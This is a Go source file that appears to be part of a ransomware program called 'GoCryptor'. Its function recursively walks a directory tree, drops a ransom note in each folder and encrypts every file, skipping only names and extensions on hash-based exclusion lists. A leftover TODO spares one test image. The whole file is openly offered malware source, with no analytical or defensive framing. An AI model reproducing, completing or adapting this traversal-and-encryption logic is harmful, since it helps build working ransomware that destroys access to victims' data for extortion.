package main

import (
	"io/ioutil"
	"log"
	"strings"
)

func DFSTraverseSingle(dirPath string) {
	files, err := ioutil.ReadDir(dirPath)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		// fmt.Println(dirPath+"\\"+file.Name(), file.IsDir())
		if file.IsDir() {
			dropRansomNote(dirPath)
			// fmt.Println(file.Name(), "is dir name")
			if checkNameInHashList(file.Name(), GoCryptorConfig.folderHashList) {
				// fmt.Println("Folder not valid...", file.Name())
				continue
			}

			DFSTraverseSingle(dirPath + "\\" + file.Name())
		} else {
			if checkNameInHashList(file.Name(), GoCryptorConfig.fileHashList) {
				// fmt.Println("Filename not valid...", file.Name())
				continue
			}
			fileExtension := file.Name()[strings.LastIndex(file.Name(), ".")+1:]
			if checkNameInHashList(fileExtension, GoCryptorConfig.extensionHashList) {
				// fmt.Println("Extension not valid...", fileExtension)
				continue
			}

			if file.Name() == "readme.txt" {
				continue
			}

			if file.Name() != "squirrel_2.jpg" { // TODO: Remove this once done
				encryptFileFull(dirPath+"\\"+file.Name(), file)
			}
		}
	}
}
